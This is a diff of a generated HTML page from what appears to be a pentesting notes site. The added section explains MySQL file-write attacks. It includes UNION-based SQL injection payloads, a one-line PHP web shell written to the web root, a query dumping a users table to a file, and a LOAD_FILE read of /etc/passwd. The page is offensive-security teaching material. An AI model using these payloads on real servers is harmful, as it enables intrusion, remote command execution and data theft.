@@ -4212,7 +4212,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../sqlite/" class="md-nav__link">
+      <a href="../sqlite.md" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -17785,6 +17785,52 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 <p>Take a wordpress installation that uses a mysql database. If you manage to login into the mysql panel (/phpmyadmin) as root then you could upload a php shell to the /wp-content/uploads/ folder.</p>
 <div class="language-mysql highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-12-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1"></a><span class="k">Select</span><span class="w"> </span><span class="s2">&quot;&lt;?php echo shell_exec($_GET[&#39;cmd&#39;]);?&gt;&quot;</span><span class="w"> </span><span class="k">into</span><span class="w"> </span><span class="k">outfile</span><span class="w"> </span><span class="s2">&quot;/var/www/https/blogblog/wp-content/uploads/shell.php&quot;</span><span class="p">;</span>
 </span></code></pre></div></td></tr></table></div>
+<p>Another example: </p>
+<p><strong>To be able to write files to the back-end server using a MySQL database, we require three things:</strong></p>
+<p><strong>1.</strong> User with <code>FILE</code> privilege enabled. If our user is root:</p>
+<div class="language-sql highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-13-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">grantee</span><span class="p">,</span><span class="w"> </span><span class="n">privilege_type</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">user_privileges</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">grantee</span><span class="o">=</span><span class="ss">&quot;&#39;root&#39;@&#39;localhost&#39;&quot;</span><span class="c1">-- -</span>
+</span></code></pre></div></td></tr></table></div>
+<p><strong>2.</strong>  MySQL global <code>secure_file_priv</code> variable not enabled</p>
+<div class="language-sql highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-14-1">1</a></span>
+<span class="normal"><a href="#__codelineno-14-2">2</a></span>
+<span class="normal"><a href="#__codelineno-14-3">3</a></span>
+<span class="normal"><a href="#__codelineno-14-4">4</a></span>
+<span class="normal"><a href="#__codelineno-14-5">5</a></span>
+<span class="normal"><a href="#__codelineno-14-6">6</a></span>
+<span class="normal"><a href="#__codelineno-14-7">7</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1"></a><span class="k">SHOW</span><span class="w"> </span><span class="n">VARIABLES</span><span class="w"> </span><span class="k">LIKE</span><span class="w"> </span><span class="s1">&#39;secure_file_priv&#39;</span><span class="p">;</span>
+</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2"></a>
+</span><span id="__span-14-3"><a id="__codelineno-14-3" name="__codelineno-14-3"></a><span class="o">#</span><span class="w"> </span><span class="k">Final</span><span class="w"> </span><span class="k">SQL</span><span class="w"> </span><span class="n">query</span>
+</span><span id="__span-14-4"><a id="__codelineno-14-4" name="__codelineno-14-4"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">variable_name</span><span class="p">,</span><span class="w"> </span><span class="n">variable_value</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">global_variables</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">variable_name</span><span class="o">=</span><span class="ss">&quot;secure_file_priv&quot;</span>
+</span><span id="__span-14-5"><a id="__codelineno-14-5" name="__codelineno-14-5"></a>
+</span><span id="__span-14-6"><a id="__codelineno-14-6" name="__codelineno-14-6"></a><span class="o">#</span><span class="w"> </span><span class="k">In</span><span class="w"> </span><span class="n">an</span><span class="w"> </span><span class="n">example</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="n">an</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="n">query</span><span class="w"> </span><span class="n">attack</span><span class="p">:</span>
+</span><span id="__span-14-7"><a id="__codelineno-14-7" name="__codelineno-14-7"></a><span class="o">#</span><span class="w"> </span><span class="n">cn</span><span class="err">&#39;</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="n">variable_name</span><span class="p">,</span><span class="w"> </span><span class="n">variable_value</span><span class="p">,</span><span class="w"> </span><span class="mi">4</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">global_variables</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">variable_name</span><span class="o">=</span><span class="ss">&quot;secure_file_priv&quot;</span><span class="c1">-- -</span>
+</span></code></pre></div></td></tr></table></div>
+<p>The <a href="https://mariadb.com/kb/en/server-system-variables/#secure_file_priv">secure_file_priv</a> variable is used to determine where to read/write files from. MariaDB has this variable set to empty by default, which lets us read/write to any file if the user has the <code>FILE</code> privilege. However, <code>MySQL</code> uses <code>/var/lib/mysql-files</code> as the default folder. This means that reading files through a <code>MySQL</code> injection isn't possible with default settings.</p>
+<p><strong>3.</strong>  Write access to the location we want to write to on the back-end server. The <a href="https://mariadb.com/kb/en/select-into-outfile/">SELECT INTO OUTFILE</a> statement can be used to write data from select queries into files. This is usually used for exporting data from tables.</p>
+<div class="language-sql highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-15-1">1</a></span>
+<span class="normal"><a href="#__codelineno-15-2">2</a></span>
+<span class="normal"><a href="#__codelineno-15-3">3</a></span>
+<span class="normal"><a href="#__codelineno-15-4">4</a></span>
+<span class="normal"><a href="#__codelineno-15-5">5</a></span>
+<span class="normal"><a href="#__codelineno-15-6">6</a></span>
+<span class="normal"><a href="#__codelineno-15-7">7</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">INTO</span><span class="w"> </span><span class="n">OUTFILE</span><span class="w"> </span><span class="s1">&#39;/tmp/credentials&#39;</span><span class="p">;</span>
+</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2"></a>
+</span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3"></a><span class="o">#</span><span class="w"> </span><span class="n">This</span><span class="w"> </span><span class="n">will</span><span class="w"> </span><span class="k">create</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">test</span><span class="p">.</span><span class="n">txt</span><span class="w"> </span><span class="n">file</span><span class="w"> </span><span class="n">owned</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">mysql</span><span class="w"> </span><span class="k">user</span>
+</span><span id="__span-15-4"><a id="__codelineno-15-4" name="__codelineno-15-4"></a><span class="k">SELECT</span><span class="w"> </span><span class="s1">&#39;this is a test&#39;</span><span class="w"> </span><span class="k">INTO</span><span class="w"> </span><span class="n">OUTFILE</span><span class="w"> </span><span class="s1">&#39;/tmp/test.txt&#39;</span><span class="p">;</span>
+</span><span id="__span-15-5"><a id="__codelineno-15-5" name="__codelineno-15-5"></a>
+</span><span id="__span-15-6"><a id="__codelineno-15-6" name="__codelineno-15-6"></a><span class="o">#</span><span class="w"> </span><span class="n">Example</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="n">an</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="n">injection</span><span class="w"> </span><span class="n">attack</span><span class="p">:</span>
+</span><span id="__span-15-7"><a id="__codelineno-15-7" name="__codelineno-15-7"></a><span class="n">cn</span><span class="s1">&#39; union select 1,&#39;</span><span class="n">file</span><span class="w"> </span><span class="n">written</span><span class="w"> </span><span class="n">successfully</span><span class="o">!</span><span class="s1">&#39;,3,4 into outfile &#39;</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="n">proof</span><span class="p">.</span><span class="n">txt</span><span class="err">&#39;</span><span class="c1">-- -</span>
+</span></code></pre></div></td></tr></table></div>
+<p><strong>Tip</strong>: Advanced file exports utilize the 'FROM_BASE64("base64_data")' function in order to be able to write long/advanced files, including binary data.</p>
+<p>Now, uploading a shell. This is a PHP shell:</p>
+<div class="language-php highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-16-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1"></a><span class="cp">&lt;?php</span> <span class="nb">system</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span> <span class="cp">?&gt;</span>
+</span></code></pre></div></td></tr></table></div>
+<p>Let's replicate the UNION injection attack:</p>
+<div class="language-sql highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-17-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1"></a><span class="n">cn</span><span class="s1">&#39; union select &quot;&quot;,&#39;</span><span class="o">&lt;?</span><span class="n">php</span><span class="w"> </span><span class="k">system</span><span class="p">(</span><span class="err">$</span><span class="n">_REQUEST</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span><span class="w"> </span><span class="o">?&gt;</span><span class="s1">&#39;, &quot;&quot;, &quot;&quot; into outfile &#39;</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="n">shell</span><span class="p">.</span><span class="n">php</span><span class="err">&#39;</span><span class="c1">-- -</span>
+</span></code></pre></div></td></tr></table></div>
+<p>This can be verified by browsing to the <code>/shell.php</code> file and executing commands via the <code>0</code> parameter, with <code>?0=id</code> in our URL:</p>
+<div class="language-html highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-18-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1"></a>https://$ip:$port/shell.php?0=id
+</span></code></pre></div></td></tr></table></div>
 <h3 id="writing-files">Writing files</h3>
 <p><code>MySQL</code> supports <a href="https://dotnettutorials.net/lesson/user-defined-functions-in-mysql/">User Defined Functions</a> which allows us to execute C/C++ code as a function within SQL, there's one User Defined Function for command execution in this <a href="https://github.com/mysqludf/lib_mysqludf_sys">GitHub repository</a>.</p>
 <p><code>MySQL</code> does not have a stored procedure like <code>xp_cmdshell</code>, but we can achieve command execution if we write to a location in the file system that can execute our commands. So basically, we need to check if we have enough privileges to do so. </p>
@@ -17796,38 +17842,38 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 <li><em>is empty</em>: the variable has no effect, which is not a secure setting. </li>
 </ul>
 <p>Example:</p>
-<div class="language-shell-session highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-13-1">1</a></span>
-<span class="normal"><a href="#__codelineno-13-2">2</a></span>
-<span class="normal"><a href="#__codelineno-13-3">3</a></span>
-<span class="normal"><a href="#__codelineno-13-4">4</a></span>
-<span class="normal"><a href="#__codelineno-13-5">5</a></span>
-<span class="normal"><a href="#__codelineno-13-6">6</a></span>
-<span class="normal"><a href="#__codelineno-13-7">7</a></span>
-<span class="normal"><a href="#__codelineno-13-8">8</a></span>
-<span class="normal"><a href="#__codelineno-13-9">9</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1"></a><span class="go">mysql&gt; show variables like &quot;secure_file_priv&quot;;</span>
-</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2"></a>
-</span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3"></a><span class="go">+------------------+-------+</span>
-</span><span id="__span-13-4"><a id="__codelineno-13-4" name="__codelineno-13-4"></a><span class="go">| Variable_name    | Value |</span>
-</span><span id="__span-13-5"><a id="__codelineno-13-5" name="__codelineno-13-5"></a><span class="go">+------------------+-------+</span>
-</span><span id="__span-13-6"><a id="__codelineno-13-6" name="__codelineno-13-6"></a><span class="go">| secure_file_priv |       |</span>
-</span><span id="__span-13-7"><a id="__codelineno-13-7" name="__codelineno-13-7"></a><span class="go">+------------------+-------+</span>
-</span><span id="__span-13-8"><a id="__codelineno-13-8" name="__codelineno-13-8"></a>
-</span><span id="__span-13-9"><a id="__codelineno-13-9" name="__codelineno-13-9"></a><span class="go">1 row in set (0.005 sec)</span>
+<div class="language-shell-session highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-19-1">1</a></span>
+<span class="normal"><a href="#__codelineno-19-2">2</a></span>
+<span class="normal"><a href="#__codelineno-19-3">3</a></span>
+<span class="normal"><a href="#__codelineno-19-4">4</a></span>
+<span class="normal"><a href="#__codelineno-19-5">5</a></span>
+<span class="normal"><a href="#__codelineno-19-6">6</a></span>
+<span class="normal"><a href="#__codelineno-19-7">7</a></span>
+<span class="normal"><a href="#__codelineno-19-8">8</a></span>
+<span class="normal"><a href="#__codelineno-19-9">9</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1"></a><span class="go">mysql&gt; show variables like &quot;secure_file_priv&quot;;</span>
+</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2"></a>
+</span><span id="__span-19-3"><a id="__codelineno-19-3" name="__codelineno-19-3"></a><span class="go">+------------------+-------+</span>
+</span><span id="__span-19-4"><a id="__codelineno-19-4" name="__codelineno-19-4"></a><span class="go">| Variable_name    | Value |</span>
+</span><span id="__span-19-5"><a id="__codelineno-19-5" name="__codelineno-19-5"></a><span class="go">+------------------+-------+</span>
+</span><span id="__span-19-6"><a id="__codelineno-19-6" name="__codelineno-19-6"></a><span class="go">| secure_file_priv |       |</span>
+</span><span id="__span-19-7"><a id="__codelineno-19-7" name="__codelineno-19-7"></a><span class="go">+------------------+-------+</span>
+</span><span id="__span-19-8"><a id="__codelineno-19-8" name="__codelineno-19-8"></a>
+</span><span id="__span-19-9"><a id="__codelineno-19-9" name="__codelineno-19-9"></a><span class="go">1 row in set (0.005 sec)</span>
 </span></code></pre></div></td></tr></table></div>
 <p>Now, as for demo purposes, let's imagine that <code>MySQL</code> operates on a PHP-based web server or other programming languages like ASP.NET, having  the appropriate privileges, we will attempt to write a file using <a href="https://mariadb.com/kb/en/select-into-outfile/">SELECT INTO OUTFILE</a> in the webserver directory. </p>
-<div class="language-mysql highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-14-1">1</a></span>
-<span class="normal"><a href="#__codelineno-14-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1"></a><span class="c1"># Browse to the location where the file is and execute the commands.</span>
-</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2"></a><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="s2">&quot;&lt;?php echo shell_exec($_GET[&#39;c&#39;]);?&gt;&quot;</span><span class="w"> </span><span class="k">INTO</span><span class="w"> </span><span class="k">OUTFILE</span><span class="w"> </span><span class="s1">&#39;/var/www/html/webshell.php&#39;</span><span class="p">;</span>
+<div class="language-mysql highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-20-1">1</a></span>
+<span class="normal"><a href="#__codelineno-20-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1"></a><span class="c1"># Browse to the location where the file is and execute the commands.</span>
+</span><span id="__span-20-2"><a id="__codelineno-20-2" name="__codelineno-20-2"></a><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="s2">&quot;&lt;?php echo shell_exec($_GET[&#39;c&#39;]);?&gt;&quot;</span><span class="w"> </span><span class="k">INTO</span><span class="w"> </span><span class="k">OUTFILE</span><span class="w"> </span><span class="s1">&#39;/var/www/html/webshell.php&#39;</span><span class="p">;</span>
 </span></code></pre></div></td></tr></table></div>
 <h3 id="reading-files">Reading files</h3>
 <h4 id="mysql-read-local-files-in-mysql">MySQL - Read Local Files in MySQL</h4>
 <p>If permissions allows it:</p>
-<div class="language-shell-session highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-15-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1"></a><span class="go">select LOAD_FILE(&quot;/etc/passwd&quot;);</span>
+<div class="language-shell-session highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-21-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1"></a><span class="go">select LOAD_FILE(&quot;/etc/passwd&quot;);</span>
 </span></code></pre></div></td></tr></table></div>
 
 <!-- This section adds support for localized revision dates -->
 
-    <small>Last update: <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-timeago"><span class="timeago" datetime="2024-10-26T10:17:25+00:00" locale="en"></span></span><span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date">2024-10-26</span></small></br>
+    <small>Last update: <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-timeago"><span class="timeago" datetime="2025-01-14T20:28:20+00:00" locale="en"></span></span><span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date">2025-01-14</span></small></br>
 
 
     <small>Created: January 1, 2023 21:59:36</small>
